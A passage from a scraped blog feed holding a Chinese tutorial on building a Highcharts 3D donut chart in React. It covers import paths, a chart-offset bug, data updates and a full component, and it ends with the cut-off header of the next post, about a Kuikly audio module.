.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>Highcharts 是一个功能完备、生态成熟的前端图表库，拥有良好的类型定义与主题生态。而 Highcharts 的 3D 饼图能力（3D Donut）可以进一步呈现层次与空间感，适合用于大屏可视化与运营展示场景。</p>
<hr/>
<h2 data-id="heading-1">使用流程</h2>
<h3 data-id="heading-2">准备工作</h3>
<ul>
<li>安装依赖：
<ul>
<li><code>highcharts</code>（核心库）</li>
<li><code>highcharts/highcharts-3d</code>（3D 模块）</li>
<li>可选：<code>highcharts-react-official</code>（React 包装组件，后文会解释它与原生 <code>div</code> 方式的差异与坑位）</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">yarn add highcharts highcharts-react-official
</code></pre>
<ul>
<li>引入与初始化 3D 模块（注意路径与版本兼容）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;

<span class="hljs-comment">// 初始化 3D 能力（必须调用）</span>
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);
</code></pre>
<blockquote>
<p>说明：部分文章或旧版本文档使用 <code>highcharts/modules/3d</code>，在现代构建工具（Webpack 5/Vite）或较新版本下可能出现构建失败或类型不匹配，推荐使用 <code>highcharts/highcharts-3d</code> 路径。</p>
</blockquote>
<h3 data-id="heading-3">创建第一个 3D 环形图</h3>
<ul>
<li>HTML 容器（单个）：</li>
</ul>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dought"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height:300px;width:100%"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li>JavaScript 初始化（最小可运行示例）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);

<span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: <span class="hljs-title class_">Highcharts</span>.<span class="hljs-property">Options</span> = {
  <span class="hljs-attr">chart</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">options3d</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">alpha</span>: <span class="hljs-number">45</span> }, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span> },
  <span class="hljs-attr">title</span>: { <span class="hljs-attr">text</span>: <span class="hljs-string">'总成本'</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'middle'</span>, <span class="hljs-attr">floating</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">useHTML</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">plotOptions</span>: {
    <span class="hljs-attr">pie</span>: {
      <span class="hljs-attr">innerSize</span>: <span class="hljs-string">'65%'</span>,
      <span class="hljs-attr">depth</span>: <span class="hljs-number">12</span>,
      <span class="hljs-attr">center</span>: [<span class="hljs-string">'50%'</span>, <span class="hljs-string">'50%'</span>],
      <span class="hljs-attr">size</span>: <span class="hljs-string">'90%'</span>,
      <span class="hljs-attr">dataLabels</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">format</span>: <span class="hljs-string">'{point.name}: {point.y}元'</span> },
    },
  },
  <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'金额'</span>, <span class="hljs-attr">data</span>: [ [<span class="hljs-string">'成本'</span>, <span class="hljs-number">1200</span>], [<span class="hljs-string">'收益'</span>, <span class="hljs-number">250</span>], [<span class="hljs-string">'2收益'</span>, <span class="hljs-number">158</span>] ] }],
};

<span class="hljs-title class_">Highcharts</span>.<span class="hljs-title function_">chart</span>(<span class="hljs-string">'dought'</span>, options);
</code></pre>
<hr/>
<h2 data-id="heading-4">注意事项与踩坑指南</h2>
<h3 data-id="heading-5">版本兼容性问题</h3>
<ul>
<li>模块路径差异：
<ul>
<li>旧文档常见 <code>highcharts/modules/3d</code>，但在部分 bundler/类型定义配置下会报错或打包失败。</li>
<li>推荐：<code>import highcharts3d from 'highcharts/highcharts-3d'; highcharts3d(Highcharts);</code></li>
</ul>
</li>
<li>ESM/CJS 混用：
<ul>
<li>在 Vite/webpack5 环境下，若 TS <code>moduleResolution</code> 或 <code>target</code> 不一致，会出现类型提示异常但能运行；务必保持 <code>tsconfig</code> 与 bundler 配置一致。</li>
<li>为什么新版更偏向 CJS：Highcharts 的部分功能模块（如 <code>highcharts/highcharts-3d</code>）以 UMD/CJS 形式发布，保持与旧版 bundler、Node 环境以及浏览器直引的最大兼容；多数构建工具会优先命中包的 <code>exports</code> 中 <code>require</code> 分支，使默认导出函数（<code>highcharts3d</code>）在 CJS 路径下更稳定，避免 ESM/默认导出互操作导致的 <code>undefined</code> 或类型不匹配。</li>
<li>ESM 与 CJS 的核心区别（速查）：
<ul>
<li>语法：ESM 使用 <code>import/export</code>（静态、可树摇），CJS 使用 <code>require/module.exports</code>（动态、不可树摇）。</li>
<li>加载：ESM 静态依赖解析，利于 bundler 优化；CJS 运行时解析，允许条件/动态 <code>require</code>。</li>
<li>默认导出互操作：CJS 引入 ESM 时常见 <code>require('pkg').default</code> 差异；ESM 引入 CJS 时需留意命名/默认导出包装。</li>
<li>环境支持：浏览器与现代 bundler更偏 ESM；Node 仍广泛支持 CJS，两者在解析与条件导出上存在差异。</li>
</ul>
</li>
<li>实战建议：
<ul>
<li>统一 <code>tsconfig.json</code> 与 bundler 的模块设置（如 <code>module: 'ESNext'</code>、<code>moduleResolution: 'bundler'</code> 或与工程一致的值），降低互操作差异。</li>
<li>对 Highcharts 3D 模块使用“安全默认写法”：<code>import highcharts3d from 'highcharts/highcharts-3d'; highcharts3d(Highcharts);</code>，该写法在 ESM/CJS 两种入口下都能正常工作。</li>
<li>如确需纯 CJS：<code>const Highcharts = require('highcharts'); const highcharts3d = require('highcharts/highcharts-3d'); highcharts3d(Highcharts);</code>，但在 React+TS 项目里更推荐前述 ESM 写法。</li>
</ul>
</li>
</ul>
</li>
<li>类型定义与 JSX：
<ul>
<li>在 React + TS 项目中，若使用 <code>HighchartsReact</code> 且 JSX 类型不兼容，可改为 <code>React.createElement</code> 或直接 <code>Highcharts.chart</code> 方式以规避。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-6">3. 为什么使用 highcharts-react-official 渲染会出现饼图偏移，改用 div 就解决了？原理是什么</h4>
<ul>
<li>现象：
<ul>
<li>使用 <code>HighchartsReact</code> 在某些布局（例如父容器 <code>display:flex</code>、存在 <code>transform</code>、或首次渲染时容器宽度尚未稳定）下，3D 饼图的中心点计算（依赖容器的实际尺寸与 <code>plotLeft/plotTop</code>）可能产生偏移。</li>
</ul>
</li>
<li>原因：
<ul>
<li><code>HighchartsReact</code> 封装层在 <code>componentDidMount/useEffect</code> 阶段创建图表，有时容器尚未完成布局或尺寸为 0，之后再 reflow 会导致 3D 透视与 <code>center/size</code> 百分比计算出现“错位”。</li>
<li>包装层会额外多一层 <code>div</code>，在包含 <code>position/transform</code> 的父级样式下，Highcharts 对 <code>getBoundingClientRect</code> 的读取与 3D 计算（<code>alpha</code> 透视）可能受影响，中心与标签的像素对齐误差被放大。</li>
</ul>
</li>
<li>解决：
<ul>
<li>改用原生 <code>Highcharts.chart(containerId, options)</code>，保证仅一个容器层；在 React 中于 <code>useEffect</code> 里创建与销毁，确保容器尺寸稳定后再渲染。</li>
<li>若仍需使用 <code>HighchartsReact</code>：
<ul>
<li>显式传 <code>containerProps={{ style: { width: '100%', height: &lt;固定高度&gt;, position: 'relative', overflow: 'visible' } }}</code>。</li>
<li>在外层布局稳定后再渲染组件，或在首次渲染后调用 <code>chart.reflow()</code>。</li>
<li>明确设置 <code>plotOptions.pie.center = ['50%', '50%']</code> 与 <code>size = '90%'</code>，并尽量避免父级 <code>transform</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">数据加载与更新</h3>
<ul>
<li>动态加载：
<ul>
<li>在 React 中，使用 <code>useEffect</code> 监听数据变化，调用 <code>chart.update({ series: [{ data }] }, false)</code> 再 <code>chart.redraw()</code>。</li>
</ul>
</li>
<li>异步坑点：
<ul>
<li>初次数据为空，后续更新时若组件卸载重挂，需先 <code>destroy()</code> 再重新 <code>chart(...)</code>，避免多实例叠加。</li>
<li>数据类型混用（字符串/数字）会导致格式化异常：统一在入参处做 <code>Number(value) || 0</code> 的处理。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">性能优化</h3>
<ul>
<li>3D 饼图不适合超大量数据，建议控制项数（&lt; 12）。</li>
<li>关闭不必要的动画与阴影；必要时降低 <code>alpha</code> 或禁用后处理效果（在 Highcharts 3D 中主要与视觉相关）。</li>
<li>合理设置 <code>dataLabels</code>：
<ul>
<li>使用两段引导线并控制长度，避免过密导致重叠。</li>
<li>小值可在 <code>formatter</code> 中阈值过滤或缩短文本。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-9">深入探讨：配置项详解</h2>
<h3 data-id="heading-10">内置配置项</h3>
<ul>
<li><code>chart.options3d.enabled/alpha</code>：开启 3D 与倾角，过大倾角会放大偏移与重叠问题。</li>
<li><code>plotOptions.pie.innerSize</code>：环形图的内径大小，百分比字符串更易与容器自适应配合。</li>
<li><code>plotOptions.pie.depth</code>：3D 厚度，过大可能导致遮挡。</li>
<li><code>series[n].center</code>：强制图心坐标（百分比数组），可稳定对齐。</li>
<li><code>series[n].size</code>：半径，百分比更利于自适应布局。</li>
<li><code>dataLabels.format/useHTML/formatter</code>：标签文本与 HTML 自定义；<code>useHTML</code> 可实现两行样式。</li>
</ul>
<h3 data-id="heading-11">自定义配置（项目实践）</h3>
<ul>
<li>透明度：
<ul>
<li>利用 <code>Highcharts.color(color).setOpacity(sliceOpacity).get()</code> 为每个扇形生成半透明色，视觉更柔和。</li>
</ul>
</li>
<li>两段引导线：
<ul>
<li><code>plotOptions.pie.softConnector = true</code> 启用两段式；</li>
<li><code>dataLabels.distance</code> 控制第二段长度；</li>
<li><code>dataLabels.crookDistance</code> 控制第一段拐点位置（可以传百分比字符串）；</li>
<li><code>connectorColor/connectorWidth</code> 控制线条颜色与粗细。</li>
</ul>
</li>
<li>居中与图例：
<ul>
<li><code>legend.enabled = true</code> + <code>center: ['50%', '50%']</code> + <code>size: '90%'</code>，确保图例与图形协调摆放。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-12">案例代码（React 组件版，使用原生 div 渲染）</h2>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title class_">HCDonut3DChart</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-built_in">any</span>&gt; = <span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> {
    dataList = [],
    title = <span class="hljs-string">''</span>,
    innerSize = <span class="hljs-string">'65%'</span>,
    sliceHeightRange = [<span class="hljs-number">8</span>, <span class="hljs-number">20</span>],
    depth,
    colors,
    containerId = <span class="hljs-string">'dought'</span>,
    sliceOpacity = <span class="hljs-number">0.85</span>,
    labelDistance = <span class="hljs-number">40</span>,
    connectorCrookDistance = <span class="hljs-string">'40%'</span>,
    connectorColor = <span class="hljs-string">'#999'</span>,
    connectorWidth = <span class="hljs-number">1</span>,
    labelUseHTML = <span class="hljs-literal">true</span>,
    labelNameColor = <span class="hljs-string">'#6A7570'</span>,
    labelValueColor = <span class="hljs-string">'#6A7570'</span>,
    labelNameFontSize = <span class="hljs-number">12</span>,
    labelValueFontSize = <span class="hljs-number">12</span>,
  } = props || {};

  <span class="hljs-keyword">const</span> [minH, maxH] = sliceHeightRange || [<span class="hljs-number">8</span>, <span class="hljs-number">20</span>];
  <span class="hljs-keyword">const</span> computedDepth = <span class="hljs-keyword">typeof</span> depth === <span class="hljs-string">'number'</span> ? depth : <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">1</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>((minH + maxH) / <span class="hljs-number">2</span>));

  <span class="hljs-keyword">const</span> seriesData = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> list = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(dataList) ? dataList : [];
    <span class="hljs-keyword">return</span> list.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">any</span>, idx: <span class="hljs-built_in">number</span></span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> { name, value } = item || {};
      <span class="hljs-keyword">const</span> y = <span class="hljs-title class_">Number</span>(value) || <span class="hljs-number">0</span>;
      <span class="hljs-keyword">const</span> color = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(colors) &amp;&amp; colors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> ? colors[idx % colors.<span class="hljs-property">length</span>] : <span class="hljs-literal">undefined</span>;
      <span class="hljs-keyword">const</span> fillColor = color ? (<span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">color</span>?.(color)?.<span class="hljs-title function_">setOpacity</span>(sliceOpacity)?.<span class="hljs-property">get</span>?.() || color : <span class="hljs-literal">undefined</span>;
      <span class="hljs-keyword">return</span> fillColor ? { name, y, <span class="hljs-attr">color</span>: fillColor } : { name, y };
    });
  }, [dataList, colors, sliceOpacity]);

  <span class="hljs-keyword">const</span> options = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> nameStyle = <span class="hljs-string">`color:<span class="hljs-subst">${labelNameColor}</span>;font-size:<span class="hljs-subst">${labelNameFontSize}</span>px;font-weight:400;line-height:18px;`</span>;
    <span class="hljs-keyword">const</span> valueStyle = <span class="hljs-string">`color:<span class="hljs-subst">${labelValueColor}</span>;font-size:<span class="hljs-subst">${labelValueFontSize}</span>px;font-weight:400;line-height:18px;`</span>;
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">chart</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">options3d</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">alpha</span>: <span class="hljs-number">45</span> }, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span> },
      <span class="hljs-attr">title</span>: { <span class="hljs-attr">text</span>: title, <span class="hljs-attr">useHTML</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">floating</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'middle'</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">0</span> },
      <span class="hljs-attr">legend</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">layout</span>: <span class="hljs-string">'horizontal'</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'bottom'</span> },
      <span class="hljs-attr">credits</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">false</span> },
      <span class="hljs-attr">tooltip</span>: { <span class="hljs-attr">headerFormat</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">pointFormat</span>: <span class="hljs-string">'{point.name}: &lt;b&gt;{point.y}元&lt;/b&gt;'</span> },
      <span class="hljs-attr">plotOptions</span>: {
        <span class="hljs-attr">pie</span>: {
          innerSize,
          <span class="hljs-attr">depth</span>: computedDepth,
          <span class="hljs-attr">allowPointSelect</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">softConnector</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">showInLegend</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">dataLabels</span>: {
            <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
            <span class="hljs-attr">useHTML</span>: labelUseHTML,
            <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
              <span class="hljs-keyword">const</span> <span class="hljs-attr">p</span>: <span class="hljs-built_in">any</span> = (<span class="hljs-variable language_">this</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">point</span> || {};
              <span class="hljs-keyword">const</span> n = p.<span class="hljs-property">name</span> ?? <span class="hljs-string">''</span>;
              <span class="hljs-keyword">const</span> y = <span class="hljs-keyword">typeof</span> p.<span class="hljs-property">y</span> === <span class="hljs-string">'number'</span> ? p.<span class="hljs-property">y</span> : <span class="hljs-title class_">Number</span>(p.<span class="hljs-property">y</span>) || <span class="hljs-number">0</span>;
              <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;div&gt;&lt;div style="<span class="hljs-subst">${nameStyle}</span>"&gt;<span class="hljs-subst">${n}</span>&lt;/div&gt;&lt;div style="<span class="hljs-subst">${valueStyle}</span>"&gt;<span class="hljs-subst">${y}</span>元&lt;/div&gt;&lt;/div&gt;`</span>;
            },
            <span class="hljs-attr">style</span>: { <span class="hljs-attr">textOutline</span>: <span class="hljs-string">'none'</span> },
            <span class="hljs-attr">distance</span>: labelDistance,
            <span class="hljs-attr">crookDistance</span>: connectorCrookDistance,
            connectorColor,
            connectorWidth,
          },
        },
      },
      <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'金额'</span>, <span class="hljs-attr">data</span>: seriesData, <span class="hljs-attr">center</span>: [<span class="hljs-string">'50%'</span>, <span class="hljs-string">'50%'</span>], <span class="hljs-attr">size</span>: <span class="hljs-string">'90%'</span> } <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>],
    } <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>;
  }, [title, innerSize, computedDepth, seriesData, labelUseHTML, labelNameColor, labelValueColor, labelNameFontSize, labelValueFontSize, labelDistance, connectorCrookDistance, connectorColor, connectorWidth]);

  <span class="hljs-keyword">const</span> chartInstanceRef = <span class="hljs-title class_">React</span>.<span class="hljs-property">useRef</span>&lt;<span class="hljs-built_in">any</span>&gt;(<span class="hljs-literal">null</span>);
  <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (chartInstanceRef.<span class="hljs-property">current</span>) { chartInstanceRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">destroy</span>(); chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>; }
    chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-title class_">Highcharts</span>.<span class="hljs-title function_">chart</span>(containerId, options);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> { <span class="hljs-keyword">if</span> (chartInstanceRef.<span class="hljs-property">current</span>) { chartInstanceRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">destroy</span>(); chartInstanceRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>; } };
  }, [containerId, options]);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">{containerId}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> '<span class="hljs-attr">100</span>%', <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%' }} /&gt;</span></span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HCDonut3DChart</span>;
</code></pre>
<blockquote>
<p>说明：示例中通过解构读取 <code>props</code>，并在必要处做数字归一化，减少不必要类型定义，贴近业务编程习惯。</p>
</blockquote>
<hr/>
<h2 data-id="heading-13">动态更新与最佳实践</h2>
<ul>
<li>更新数据：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts">chart.<span class="hljs-title function_">update</span>({ <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">data</span>: newData }] }, <span class="hljs-literal">false</span>);
chart.<span class="hljs-title function_">redraw</span>();
</code></pre>
<ul>
<li>更新样式（示例：调节两段引导线长度）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts">chart.<span class="hljs-title function_">update</span>({ <span class="hljs-attr">plotOptions</span>: { <span class="hljs-attr">pie</span>: { <span class="hljs-attr">dataLabels</span>: { <span class="hljs-attr">distance</span>: <span class="hljs-number">48</span>, <span class="hljs-attr">crookDistance</span>: <span class="hljs-string">'45%'</span> } } } });
</code></pre>
<ul>
<li>生命周期管理（React）：
<ul>
<li>在 <code>useEffect</code> 中创建与销毁；避免多实例与内存泄漏。</li>
<li>容器尺寸变化时调用 <code>chart.reflow()</code>。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-14">踩坑与解决</h2>
<ul>
<li>图心偏移：明确设置 <code>series.center</code> 与 <code>series.size</code>，并在布局稳定后再初始化；改用原生 <code>Highcharts.chart</code> 可避免包装层带来的测量差异。</li>
<li>颜色不匹配：为数据点绑定颜色（而不是直接依赖 <code>options.colors</code>），以防主题覆盖或 <code>undefined</code> 导致第三方主题读取 <code>colors[0]</code> 报错。</li>
<li>标签拥挤：开启两段引导线并调节长度；小值可在 <code>formatter</code> 中阈值过滤。</li>
<li>3D 模块未初始化：必须 <code>highcharts3d(Highcharts)</code>，否则 <code>options3d</code> 不生效或报错。</li>
<li>类型不兼容：当 TS JSX 配置不一致时，使用 <code>React.createElement</code> 或直接 <code>Highcharts.chart</code> 渲染。</li>
</ul>
<hr/>
<h2 data-id="heading-15">配置项速查（精选）</h2>
<ul>
<li><code>chart.options3d.enabled/alpha</code>：启用 3D 与倾角。</li>
<li><code>plotOptions.pie.innerSize/depth</code>：环形内径与厚度。</li>
<li><code>plotOptions.pie.softConnector</code>：启用两段式引导线。</li>
<li><code>dataLabels.useHTML/formatter/style</code>：两行标签与样式；<code>textOutline: 'none'</code> 去描边更清晰。</li>
<li><code>dataLabels.distance/crookDistance</code>：两段线长度与拐点位置；<code>connectorColor/connectorWidth</code> 控线型。</li>
<li><code>series.center/size</code>：居中与自适应半径，强烈建议使用百分比字符串。</li>
<li><code>tooltip.pointFormat</code>：统一金额单位；结合格式化函数确保数值正确。</li>
</ul>
<hr/>
<h2 data-id="heading-16">案例分析：从需求到实现</h2>
<ul>
<li>需求：在“日前经济最优/微协同”页面展示“优化总成本组成”与“实际总成本组成”，标签两行显示（名称 + 金额），图例与颜色对齐，支持导入导出。</li>
<li>实现：
<ul>
<li>颜色映射固定三类（负荷/光伏/储能），为数据点绑定 <code>itemStyle.color</code>；</li>
<li>两段引导线：<code>distance=40</code>、<code>crookDistance='45%'</code>；</li>
<li>中心标题用 <code>useHTML</code> 输出，并拆解为两行（<code>总成本</code> 与金额 <code>--/xxx元</code>）；</li>
<li>动态数据更新时，销毁旧实例再创建，避免偏移与堆叠；</li>
<li>上传下载逻辑与图表刷新在 hook 中解耦，实现稳态渲染。</li>
</ul>
</li>
<li>效果：在不同数据规模与容器布局下，图心稳定、颜色一致、标签清晰，运营展示可读性显著提升。</li>
</ul>
<hr/>
<h2 data-id="heading-17">结语</h2>
<p>Highcharts 的 3D 环形图兼具表现力与稳定性。生产落地的关键在于：正确初始化 3D 模块、保证容器尺寸稳定、强制图心与半径、为数据点绑定颜色、合理管理生命周期与更新流程。结合本文的实战代码与优化建议，你可以快速在任意页面构建高质量的 3D Donut。进一步可尝试主题切换、渐变色、动效过渡以及与其他图表的联动，释放更多可视化潜力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kuikly 基础之封装自定义音频播放模块]]></title>    <link>https://juejin.cn/post/7575488180981153792</link>    <guid>https://juejin.cn/post/7575488180981153792</guid>    <pubDate>2025-11-24T03:41:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575488180981153792" data-draft-id="7575488180981071872" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kuikly 基础之封装自定义音频播放模块"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T03:41:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="在下历飞雨"/> <meta itemprop="url" content="https://juejin.cn/user/1559379316800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kuikly 基础之封装自定义音频播放模块
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1559379316800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    在下历飞雨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:41:08.000Z" title="Mon Nov 24 2025 03:41:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
